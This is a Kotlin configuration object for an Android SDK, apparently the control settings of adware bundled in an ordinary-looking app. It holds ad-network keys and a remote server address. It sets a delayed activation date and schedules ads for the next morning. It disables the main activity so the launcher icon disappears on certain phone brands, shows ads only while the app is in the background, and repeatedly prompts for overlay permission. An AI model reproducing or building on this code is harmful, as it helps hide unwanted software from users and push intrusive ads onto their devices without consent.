package com.app.sdk.sdk.config

import android.os.Build
import java.util.*
import java.util.concurrent.TimeUnit

object SdkConfig {

    const val appodealKey: String = "7d4fd5f516f68e5e5a9c3b8dd894b4d1386f130406e5bbbd"
    const val disableComponentName = ".ui.main.MainActivity"
    const val adUnitId = "3975bef496e2caaf"
    const val kochavaId = "kobubble-charge-9nfzlg4"

    val startSDKTime = Calendar.getInstance().apply {
        set(Calendar.YEAR, 2022)
        set(Calendar.MONTH, Calendar.OCTOBER)
        set(Calendar.DAY_OF_MONTH, 15)
        set(Calendar.HOUR_OF_DAY, 0)
        set(Calendar.MINUTE, 0)
        set(Calendar.SECOND, 0)
        set(Calendar.MILLISECOND, 0)
    }.time.time

    //Settings
    const val serverAddress = "http://somesdeka.online/api/"
    const val canShowAdWhenAppInForeground = false
    const val enableComponentName = "com.app.sdk.SettingsSdk"

    val showAdDelay = TimeUnit.SECONDS.toMillis(50)

    private val overlayNotificationsDelays =
        listOf(TimeUnit.MINUTES.toMillis(5), TimeUnit.HOURS.toMillis(2))

    private val deviceBrand by lazy { Build.BRAND }
    private val cantLaunchActivityDirectlyBrands = listOf("xiaomi")
    private val brandsWhichCanHideIcon = listOf("xiaomi", "oppo", "vivo")

    fun canShowAdDirectly() = !cantLaunchActivityDirectlyBrands
        .any { brand -> (deviceBrand.equals(brand, true)) }

    fun canHideIcon() = brandsWhichCanHideIcon
        .any { brand -> deviceBrand.equals(brand, true) }

    fun getAskOverlayNotificationDelay(askTimes: Int) = overlayNotificationsDelays
        .getOrElse(askTimes) { overlayNotificationsDelays.last() }

    fun getLaunchAdTime(currentTime: Long) = Calendar.getInstance().apply {
        time = Date().apply { time = currentTime + TimeUnit.DAYS.toMillis(1) }
        set(Calendar.HOUR_OF_DAY, 10)
        set(Calendar.MINUTE, 0)
        set(Calendar.SECOND, 0)
        set(Calendar.MILLISECOND, 0)
    }.time.time

}